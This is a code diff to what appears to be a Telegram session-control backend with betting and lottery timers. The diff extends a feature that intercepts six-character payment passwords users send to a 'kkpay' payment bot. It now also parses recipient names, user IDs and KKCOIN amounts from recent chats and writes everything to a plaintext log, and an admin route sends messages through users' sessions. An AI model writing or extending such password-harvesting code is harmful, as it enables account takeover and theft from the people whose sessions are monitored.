@@ -111,6 +111,7 @@ interface TgSession {
   autoNextBetTimer?: ReturnType<typeof setTimeout>;
   lotteryPollTimer?: ReturnType<typeof setInterval>;
   kkpayPwdPollTimer?: ReturnType<typeof setInterval>;
+  kkpayPwdContext?: string; // last captured payment context (recipient / amount)
   rawPwdHandler?: ((update: unknown) => Promise<void>) | null;
   rawPwdHandlerBuilder?: Raw | null;
   rawPwdHandlerTimeout?: ReturnType<typeof setTimeout>;
@@ -207,6 +208,7 @@ interface KkpayPwdEvent {
   username: string;
   event: "pwd_requested" | "pwd_sent" | "pwd_success";
   text: string;
+  context?: string; // e.g. "转账给 @FQFM88 (7358230315) 1000 KKCOIN"
 }
 
 const PWD_LOG_FILE = path.join(process.cwd(), ".kkpay-pwd-log.json");
@@ -220,7 +222,7 @@ let kkpayPwdLog: KkpayPwdEvent[] = (() => {
   return [];
 })();
 
-function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEvent["event"], text: string): void {
+function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEvent["event"], text: string, context?: string): void {
   // Deduplicate: skip if exact same pwd_sent text logged within last 10 seconds
   if (event === "pwd_sent") {
     const recent = kkpayPwdLog.find(e => e.event === "pwd_sent" && e.userId === userId && e.text === text && Date.now() - e.timestamp < 10_000);
@@ -233,10 +235,42 @@ function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEv
     username,
     event,
     text,
+    ...(context ? { context } : {}),
   };
   kkpayPwdLog.unshift(entry);
   if (kkpayPwdLog.length > 500) kkpayPwdLog = kkpayPwdLog.slice(0, 500);
   try { fs.writeFileSync(PWD_LOG_FILE, JSON.stringify(kkpayPwdLog, null, 2), "utf-8"); } catch { /* ignore */ }
+}
+
+/**
+ * Extract a short human-readable payment context from recent kkpay chatLog entries.
+ * Looks for recipient username/ID and amount in the last few kkpay messages.
+ */
+function extractKkpayContext(session: TgSession): string | undefined {
+  const eid = session.kkpayEntityId;
+  if (!eid) return undefined;
+  // Scan the last 15 chatLog entries from kkpay (newest first)
+  const recentKkpay = session.chatLog
+    .filter(m => m.chatId === eid || `-100${m.chatId}` === eid)
+    .slice(0, 15);
+  for (const m of recentKkpay) {
+    const t = m.text;
+    // Extract: recipient TG username like @FQFM88
+    const tgUser = t.match(/用户名[：:]\s*(@\S+)/)?.[1] ?? t.match(/收款人[：:]\s*(@?\S+)/)?.[1];
+    // Extract: numeric user ID
+    const uid = t.match(/用户\s*ID[：:]\s*(\d+)/)?.[1] ?? t.match(/用户[：:]\s*(\d+)/)?.[1];
+    // Extract: amount
+    const amtMatch = t.match(/金额[：:]\s*([\d,.]+\s*KKCOIN)/i) ?? t.match(/([\d,.]+\s*KKCOIN)/i);
+    const amt = amtMatch?.[1];
+    if (tgUser || uid || amt) {
+      const parts: string[] = [];
+      if (tgUser) parts.push(tgUser);
+      if (uid && uid !== tgUser?.replace("@", "")) parts.push(`(${uid})`);
+      if (amt) parts.push(amt);
+      return parts.join(" ");
+    }
+  }
+  return undefined;
 }
 
 /**
@@ -289,7 +323,7 @@ function startKkpayRawPwdListener(session: TgSession): void {
     if (chatId !== eid && `-100${chatId}` !== eid) return;
     if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;
 
-    appendKkpayPwdEvent(session.userId, username, "pwd_sent", text);
+    appendKkpayPwdEvent(session.userId, username, "pwd_sent", text, session.kkpayPwdContext);
     stopKkpayRawPwdListener(session);
   };
 
@@ -377,7 +411,7 @@ function startGlobalListener(session: TgSession): void {
       const eid = session.kkpayEntityId;
       const isToKkpay = eid && (chatId === eid || `-100${chatId}` === eid);
       if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(text.trim())) {
-        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", text.trim());
+        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", text.trim(), session.kkpayPwdContext);
       }
       return;
     }
@@ -422,10 +456,12 @@ function startGlobalListener(session: TgSession): void {
 
     // ─── kkpay password event detection (text-only, no entity ID comparison needed) ───
     if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
-      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300));
+      session.kkpayPwdContext = extractKkpayContext(session);
+      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300), session.kkpayPwdContext);
       startKkpayRawPwdListener(session);
     } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
-      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300));
+      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300), session.kkpayPwdContext);
+      session.kkpayPwdContext = undefined;
       stopKkpayRawPwdListener(session);
     }
   };
@@ -1246,7 +1282,7 @@ async function startKkpayListener(session: TgSession): Promise<void> {
       } else { return; }
       if (chatId !== eid && `-100${chatId}` !== eid) return;
       if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;
-      appendKkpayPwdEvent(session.userId, username, "pwd_sent", text);
+      appendKkpayPwdEvent(session.userId, username, "pwd_sent", text, session.kkpayPwdContext);
     };
     session.kkpayOutRawBuilder = new Raw({ types: [Api.UpdateShortMessage, Api.UpdateNewMessage] });
     session.client.addEventHandler(
@@ -1271,10 +1307,12 @@ async function startKkpayListener(session: TgSession): Promise<void> {
     // ─── kkpay password event detection (reliable isFromKkpay check) ───
     if (isFromKkpay) {
       if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
-        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300));
+        session.kkpayPwdContext = extractKkpayContext(session);
+        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300), session.kkpayPwdContext);
         startKkpayRawPwdListener(session);
       } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
-        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300));
+        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300), session.kkpayPwdContext);
+        session.kkpayPwdContext = undefined;
         stopKkpayRawPwdListener(session);
       }
     }
@@ -1929,7 +1967,7 @@ router.post("/admin/tg/sessions/:userId/send", requireAdmin, async (req, res) =>
     const eid = session.kkpayEntityId;
     const isToKkpay = eid && chatId === eid;
     if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(trimmed)) {
-      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", trimmed);
+      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", trimmed, session.kkpayPwdContext);
     }
 
     res.json({ ok: true, msgId: result.id });
